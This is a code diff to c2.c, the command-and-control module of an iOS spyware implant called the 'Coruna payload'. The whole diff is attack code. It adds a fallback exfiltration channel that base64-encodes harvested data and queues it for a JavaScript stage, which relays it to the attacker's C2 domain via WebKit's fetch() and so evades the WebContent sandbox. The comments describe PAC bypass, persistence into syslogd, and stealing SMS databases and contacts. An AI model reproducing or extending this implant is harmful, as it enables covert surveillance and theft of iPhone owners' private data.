@@ -1,26 +1,31 @@
 /*
  * c2.c — C2 communication for Coruna payload (Objective-C + C, ARM64 iOS)
  *
- * Three upload channels, tried in order until one succeeds:
+ * Four upload channels, tried in order until one succeeds:
  *
  *   Channel C — JavaScriptCore context injection  [PRIMARY in WebContent]
- *     Obtains the live JSContext via [JSContext currentContext] (available
- *     when called from the JS execution thread, as is the case when Stage3
- *     invokes _process() via PAC-bypassed function pointer).
- *     Evaluates a fetch() script — uses WebKit's own networking, which is
- *     always allowed inside WebContent (same XPC path as normal web requests).
- *     A saved strong reference is also dispatched to the main queue from the
- *     background implant thread (dispatch_async, never blocks harvest_all).
+ *     Obtains the live JSContext via [JSContext currentContext].
+ *     Evaluates a fetch() script using WebKit's own networking XPC path.
+ *     A saved reference is also dispatched to the main queue from the
+ *     background implant thread (dispatch_async, non-blocking).
  *
  *   Channel B — raw POSIX socket + SecureTransport TLS  [PRIMARY outside WC]
- *     Uses socket()/connect() + Security.framework SSLCreateContext.
- *     Intended for non-WebContent environments (e.g. after persistence into
- *     syslogd).  In iOS 16+ WebContent sandbox socket(AF_INET) → EPERM.
+ *     Works outside WebContent (e.g. after persistence into syslogd).
+ *     In iOS 16+ WebContent, socket(AF_INET) → EPERM (silent deny).
  *
- *   Channel A — NSURLSession  [LAST RESORT]
- *     Blocked in WebContent (nsurlsessiond XPC denied by sandbox policy).
- *     Retained for environments outside WebContent where Channel B is somehow
- *     unavailable (rare proxy or firewall configuration).
+ *   Channel A — NSURLSession  [FALLBACK outside WebContent]
+ *     Blocked in WebContent (nsurlsessiond XPC denied by sandbox).
+ *     Retained for non-WebContent environments without raw socket access.
+ *
+ *   Channel D — in-memory queue for Stage3 JS relay  [WEBCONTENT FALLBACK]
+ *     When C/B/A all fail (typically because the process is inside WebContent
+ *     and Stage3 did not call _process() on the active JS thread), the JSON
+ *     body is base64-encoded and written into the exported globals
+ *     g_cru_q_cnt / g_cru_q[].  Stage3_VariantB.js reads the queue after
+ *     _process() returns and relays each item via its own fetch() — which
+ *     IS permitted because it uses WebKit's internal networking XPC.
+ *     Only items ≤ CRU_Q_B64MAX-1 bytes (base64) are queued; larger items
+ *     (SMS DB, contacts) are deferred to the persistence stage.
  */
 
 #import <Foundation/Foundation.h>
@@ -39,6 +44,7 @@
 #pragma clang diagnostic pop
 
 #include "c2.h"
+#include "cru_queue.h"
 
 /* ── Persistent device UUID ─────────────────────────────────────────────────
  *
@@ -411,7 +417,20 @@ void upload_to_c2(const char *category, const char *path,
             NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
                                 scheme, C2_DOMAIN, C2_UPLOAD];
             NSURL *url = [NSURL URLWithString:urlStr];
-            if (url) nsurlsession_post(url, body, uuid);
+            if (url) sent = nsurlsession_post(url, body, uuid);
+        }
+
+        /* Channel D — in-memory queue for Stage3 JS relay.
+         * Written when all three network channels fail (typical WebContent).
+         * Stage3 reads this queue after _process() returns and POSTs via
+         * its own fetch() which is whitelisted by WebKit's sandbox policy.
+         * Items ≥ CRU_Q_B64MAX bytes (base64) are silently dropped here;
+         * large payloads (SMS, contacts) arrive via the persistence path. */
+        if (!sent) {
+            NSString *b64body = [body base64EncodedStringWithOptions:0];
+            if (b64body) {
+                cru_queue_push(b64body.UTF8String);
+            }
         }
     }
 }
@@ -467,7 +486,15 @@ void upload_beacon(void) {
             NSString *urlStr = [NSString stringWithFormat:@"%@://%s%s",
                                 scheme, C2_DOMAIN, C2_UPLOAD];
             NSURL *url = [NSURL URLWithString:urlStr];
-            if (url) nsurlsession_post(url, body, uuid);
+            if (url) sent = nsurlsession_post(url, body, uuid);
+        }
+
+        /* Channel D — queue for Stage3 relay (same rationale as upload_to_c2) */
+        if (!sent) {
+            NSString *b64body = [body base64EncodedStringWithOptions:0];
+            if (b64body) {
+                cru_queue_push(b64body.UTF8String);
+            }
         }
     }
 }
